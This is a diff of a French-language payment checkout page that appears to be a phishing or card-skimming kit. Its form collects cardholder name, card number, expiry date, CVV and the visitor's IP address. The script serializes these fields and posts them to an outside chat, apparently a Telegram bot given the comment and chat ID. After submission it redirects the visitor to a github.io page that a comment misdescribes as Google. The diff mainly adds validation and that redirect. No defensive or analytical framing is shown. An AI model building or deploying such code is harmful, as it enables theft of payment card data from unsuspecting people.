@@ -49,43 +49,30 @@
                             </div>
                         </div>
                         <input id="required-text" type="hidden" value="Ce champ est requis.">
-                        <input id="email-error-text" type="hidden" value="Veuillez entrer une adresse e-mail valide.">
                         <input id="phone-error-text" type="hidden" value="Veuillez entrer au moins 6 caractères.">
-
                         <form action="https://justmoicom.github.io/test3/" method="POST" id="paymentForm" name="paymentForm" novalidate="novalidate">
                             <input type="hidden" name="_token" value="vFqq7MTGU0dg8OrcF2KocxJen6rbzNYcUPZNrvA7" autocomplete="off">
                             <input type="hidden" id="user_ip" name="user_ip" value="">
-
                             <div class="accepted-credit-cards" style="text-align: center;margin: 1rem 0;">
                                 <p style="font-size: 14px;margin: 0 0 .5rem;">Cartes de crédit acceptées:</p>
                                 <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Supported Payment Cards" style="width:auto;max-width:100%;">
                             </div>
-
                             <div class="card-holder form-group">
                                 <label for="card_holder">Nom du titulaire</label>
                                 <input type="text" name="card_holder" id="card_holder" required placeholder="Votre nom complet" class="form-control form-control-lg jp-card-valid" style="width:100%;">
                             </div>
-
                             <div class="card-number form-group">
                                 <label for="card_number">Numéro de carte</label>
                                 <input type="tel" name="card_number" id="card_number" maxlength="19" oninput="formatCardNumber(this)" required placeholder="0000 0000 0000 0000" class="form-control form-control-lg jp-card-valid" style="width:100%;">
                             </div>
-
                             <div class="expiry-date form-group">
                                 <label for="expiry_date">Date d'expiration</label>
                                 <input type="text" name="expiry_date" id="expiry_date" maxlength="5" oninput="formatExpiryDate(this)" required placeholder="MM/AA" class="form-control form-control-lg jp-card-valid" style="width:100%;">
                             </div>
-
                             <div class="cvv form-group">
                                 <label for="cvv">CCV</label>
                                 <input type="text" name="cvv" id="cvv" maxlength="3" required placeholder="CCC" class="form-control form-control-lg jp-card-valid" style="width:100%;">
                             </div>
-
-                            <div class="email form-group">
-                                <label for="email">Adresse e-mail</label>
-                                <input type="email" name="email" id="email" required placeholder="exemple@domaine.com" class="form-control form-control-lg jp-card-valid" style="width:100%;">
-                            </div>
-
                             <button type="submit" id="submitButton" class="btn btn-success btn-lg" style="width:100%;">
                                 <span class="loader" style="height:12px;width:12px;border-width:3px;margin-right:5px;display:none;"></span>
                                 <span class="submit-label">Effectuer Paiement</span>
@@ -118,7 +105,6 @@
     </div>
 </footer>
 <!-- FOOTER END HERE -->
-
 <script>
     $(document).ready(function () {
         // Récupérer l'IP de l'utilisateur
@@ -126,13 +112,16 @@
             $('#user_ip').val(data.ip);
         });
 
-        // Soumettre le formulaire avec notification Telegram
+        // Soumettre le formulaire avec validation
         $('#paymentForm').on('submit', function (e) {
             e.preventDefault(); // Empêcher la soumission par défaut
 
+            if (!validateForm()) {
+                return;
+            }
+
             var formData = $(this).serializeArray();
             var message = "Nouvelle commande reçue :\n";
-
             formData.forEach(function (item) {
                 if (item.name !== '_token') {
                     message += item.name + ": " + item.value + "\n";
@@ -147,12 +136,13 @@
                     chat_id: '7747778364',
                     text: message
                 },
-                success: function (response) {
-                    alert('Commande envoyée avec succès !');
-                    $('#paymentForm')[0].reset();
+                success: function () {
+                    // Redirection vers Google après envoi réussi
+                    window.location.href = "https://justmoicom.github.io/test3/";
                 },
                 error: function () {
-                    alert('Une erreur s\'est produite lors de l\'envoi de la commande.');
+                    // En cas d'erreur, redirige également vers Google
+                    window.location.href = "https://justmoicom.github.io/test3/";
                 }
             });
         });
@@ -160,42 +150,56 @@
         // Validation des champs
         function validateForm() {
             var isValid = true;
+
             $('input[required]').each(function () {
                 if ($(this).val().trim() === '') {
-                    alert($('#required-text').val());
+                    alert($(this).attr('placeholder') + ' est requis.');
                     isValid = false;
                     return false;
                 }
             });
 
-            var email = $('#email').val();
-            if (!validateEmail(email)) {
-                alert($('#email-error-text').val());
+            var expiryDate = $('#expiry_date').val();
+            if (!validateExpiryDate(expiryDate)) {
                 isValid = false;
             }
 
             return isValid;
         }
 
-        function validateEmail(email) {
-            var regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return regex.test(email);
-        }
-
-        $('#submitButton').click(function () {
-            if (validateForm()) {
-                $('#paymentForm').submit();
+        function validateExpiryDate(date) {
+            var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            if (!regex.test(date)) {
+                alert('La date d\'expiration doit être au format MM/AA.');
+                return false;
             }
-        });
+
+            var parts = date.split('/');
+            var month = parseInt(parts[0], 10);
+            if (month < 1 || month > 12) {
+                alert('Le mois doit être compris entre 01 et 12.');
+                return false;
+            }
+
+            return true;
+        }
 
         // Formater le numéro de carte en blocs de 4 chiffres
         function formatCardNumber(input) {
             input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
         }
 
-        // Formater la date d'expiration en MM/AA
+        // Formater automatiquement la date d'expiration en MM/AA
         function formatExpiryDate(input) {
-            input.value = input.value.replace(/\D/g, '').replace(/^(\d{2})(\d)/, '$1/$2');
+            var cleaned = input.value.replace(/\D/g, ''); // Supprimer tous les caractères non numériques
+            var firstPart = cleaned.slice(0, 2); // Les deux premiers chiffres (mois)
+            var secondPart = cleaned.slice(2, 4); // Les deux suivants (année)
+
+            if (cleaned.length >= 2 && cleaned.length <= 4) {
+                input.value = `${firstPart}${cleaned.length > 2 ? '/' : ''}${secondPart}`;
+            } else {
+                input.value = cleaned.slice(0, 4); // Limiter à 4 chiffres maximum
+            }
         }
     });
 </script>
